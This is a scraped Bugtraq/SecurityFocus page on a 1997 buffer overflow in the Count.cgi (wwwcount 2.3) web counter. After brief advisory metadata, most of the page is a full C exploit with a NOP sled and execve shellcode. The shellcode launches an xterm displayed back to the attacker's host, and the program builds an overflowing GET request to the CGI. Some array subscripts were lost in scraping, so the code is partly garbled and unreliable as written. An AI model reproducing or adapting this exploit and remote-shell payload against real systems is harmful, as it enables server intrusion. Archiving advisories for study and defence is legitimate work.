#SpeeDr00t@Black Falcon<br>#bid128<p><b><span style="font-size: 18pt;">Count.cgi (wwwcount) Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/128/info">info</a><br><a href="http://www.securityfocus.com/bid/128/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/128/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/128/solution">solution</a><br><a href="http://www.securityfocus.com/bid/128/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				128
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Boundary Condition Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Oct 16 1997 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Oct 16 1997 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				The view any .GIF bug was posted to the Bugtraq mailing by Razvan Dragomirescu &lt;drazvan@kappa.ro&gt; Fri, 10 Oct 1997. The buffer overrun attack was posted to the bugtraq mailing list by Nicolas Dubee (dube0866@eurobretagne.fr) Thu, 16 Oct 1997.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Muhammad A. Muquit wwwcount 2.3 <br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
				
					Muhammad A. Muquit wwwcount 2.4 <br/>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	/*<br/><br/>Count.cgi (wwwcount) linux  test exploit<br/>(c) 05/1997 by plaguez  -  dube0866@eurobretagne.fr<br/>Contact me if you manage to improve this crap.<br/><br/>This program needs drastic changes to be useable.<br/>If you can't understand how to modify it for your own purpose,<br/>please do not consider trying it.<br/><br/>*/<br/><br/><br/>#include &lt;stdio.h&gt;<br/>#include &lt;stdlib.h&gt;<br/><br/>char shell=<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"<br/>"\xeb\x3c\x5e\x31\xc0\x89\xf1\x8d"<br/>"\x5e\x18\x88\x46\x2c\x88\x46\x30"<br/>"\x88\x46\x39\x88\x46\x4b\x8d\x56"<br/>"\x20\x89\x16\x8d\x56\x2d\x89\x56"<br/>"\x04\x8d\x56\x31\x89\x56\x08\x8d"<br/>"\x56\x3a\x89\x56\x0c\x8d\x56\x10"<br/>"\x89\x46\x10\xb0\x0b\xcd\x80\x31"<br/>"\xdb\x89\xd8\x40\xcd\x80\xe8\xbf"<br/>"\xff\xff\xff\xff\xff\xff\xff\xff"<br/>"\xff\xff\xff\xff\xff\xff\xff\xff"<br/>"\xff\xff\xff\xff\xff\xff\xff\xff"<br/>"\xff\xff\xff"<br/>"/usr/X11R6/bin/xterm0-ut0-display0"<br/>"127.000.000.001:00"<br/>"\xff\xff\xff\xff\xff\xff\xff\xff"<br/>"\xff\xff\xff\xff\xff\xff\xff\xff"<br/>"\xff\xff\xff\xff\xff\xff\xff\xff"<br/>"\xff\xff\xff";<br/><br/><br/>/*<br/><br/>Assembly stuff for the previous buffer.<br/>This basically implements an execve syscall, by creating<br/>an array of char* (needs to put a null byte at the end of<br/>all strings).<br/>Here we gonna exec an xterm and send it to our host.<br/>(you can't simply exec a shell due to the cgi proto).<br/><br/>        jmp    60<br/>        popl   %esi<br/>        xorl   %eax,%eax           # efface eax<br/>        movl   %esi,%ecx           # recupere l'adresse du buffer<br/>        leal   0x18(%esi),%ebx     # recupere l'adresse des chaines<br/>        movb   %al,0x2c(%esi)      # cree les chaines azt<br/>        movb   %al,0x30(%esi)      #<br/>        movb   %al,0x39(%esi)<br/>        movb   %al,0x4b(%esi)<br/>        leal   0x20(%esi),%edx     # cree le char**<br/>        movl   %edx,(%esi)<br/>        leal   0x2d(%esi),%edx<br/>        movl   %edx,0x4(%esi)<br/>        leal   0x31(%esi),%edx<br/>        movl   %edx,0x8(%esi)<br/>        leal   0x3a(%esi),%edx<br/>        movl   %edx,0xc(%esi)<br/>        leal   0x10(%esi),%edx<br/>        movl   %eax,0x10(%esi)<br/>        movb   $0xb,%al<br/>        int    $0x80                #  passe en mode kernel<br/>        xorl   %ebx,%ebx            #  termine proprement (exit())<br/>        movl   %ebx,%eax            #  si jamais le execve() foire.<br/>        inc    %eax                 #<br/>        int    $0x80                #<br/>        call   -65                  #  retourne au popl en empilant l'adresse de la chaine<br/>        .byte  0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff<br/>        .byte  0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff<br/>        .byte  0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff<br/>        .ascii \"/usr/X11R6/bin/xterm0\"         # 44<br/>        .ascii \"-ut0\"                          # 48<br/>        .ascii \"-display0\"                 # 57  au ;<br/>        .ascii \"127.000.000.001:00\"        # 75 (total des chaines)<br/>        .byte  0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff<br/>        .byte  0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff<br/>            ...<br/> */<br/><br/>char qs7000;<br/>char chaine="user=a";<br/><br/>unsigned long getesp() {<br/>   //   asm("movl %esp,%eax");<br/>   return 0xbfffee38;<br/>}<br/><br/>void main(int argc, char **argv) {<br/>   int compt;<br/>   long stack;<br/><br/>   stack=getesp();<br/><br/>   if(argc&gt;1)<br/>     stack+=atoi(argv1);<br/><br/>   for(compt=0;compt&lt;4104;compt+=4) {<br/>      qscompt+0 = stack &amp;  0x000000ff;<br/>      qscompt+1 = (stack &amp; 0x0000ff00) &gt;&gt; 8;<br/>      qscompt+2 = (stack &amp; 0x00ff0000) &gt;&gt; 16;<br/>      qscompt+3 = (stack &amp; 0xff000000) &gt;&gt; 24;<br/>   }<br/><br/><br/>   strcpy(qs,chaine);<br/>   qsstrlen(chaine)=0x90;<br/><br/>   qs4104= stack&amp;0x000000ff;<br/>   qs4105=(stack&amp;0x0000ff00)&gt;&gt;8;<br/>   qs4106=(stack&amp;0x00ff0000)&gt;&gt;16;<br/>   qs4107=(stack&amp;0xff000000)&gt;&gt;24;<br/>   qs4108= stack&amp;0x000000ff;<br/>   qs4109=(stack&amp;0x0000ff00)&gt;&gt;8;<br/>   qs4110=(stack&amp;0x00ff0000)&gt;&gt;16;<br/>   qs4111=(stack&amp;0xff000000)&gt;&gt;24;<br/>   qs4112= stack&amp;0x000000ff;<br/>   qs4113=(stack&amp;0x0000ff00)&gt;&gt;8;<br/>   qs4114=(stack&amp;0x00ff0000)&gt;&gt;16;<br/>   qs4115=(stack&amp;0xff000000)&gt;&gt;24;<br/>   qs4116= stack&amp;0x000000ff;<br/>   qs4117=(stack&amp;0x0000ff00)&gt;&gt;8;<br/>   qs4118=(stack&amp;0x00ff0000)&gt;&gt;16;<br/>   qs4119=(stack&amp;0xff000000)&gt;&gt;24;<br/>   qs4120= stack&amp;0x000000ff;<br/>   qs4121=(stack&amp;0x0000ff00)&gt;&gt;8;<br/>   qs4122=(stack&amp;0x00ff0000)&gt;&gt;16;<br/>   qs4123=(stack&amp;0xff000000)&gt;&gt;24;<br/>   qs4124= stack&amp;0x000000ff;<br/>   qs4125=(stack&amp;0x0000ff00)&gt;&gt;8;<br/>   qs4126=(stack&amp;0x00ff0000)&gt;&gt;16;<br/>   qs4127=(stack&amp;0xff000000)&gt;&gt;24;<br/>   qs4128= stack&amp;0x000000ff;<br/>   qs4129=(stack&amp;0x0000ff00)&gt;&gt;8;<br/>   qs4130=(stack&amp;0x00ff0000)&gt;&gt;16;<br/>   qs4131=(stack&amp;0xff000000)&gt;&gt;24;<br/><br/>   strcpy((char*)&amp;qs4132,shell);<br/><br/>   /* Choose what to do here */<br/>   printf("GET /cgi-bin/Count.cgi?%s\n\n",qs);<br/>   /*fprintf(stderr,"\n\nadresse: %x0x\n",stack);<br/>   printf("GET /cgi-bin/Count.cgi?%s HTTP/1.0\nUser-Agent: %x\n\n",qs,stack);<br/>   setenv("QUERY_STRING",qs,1);<br/>   system("/usr/local/etc/httpd/cgi-bin/Count.cgi");<br/>   system("/bin/sh");*/
	
		<ul>
</ul>
</div>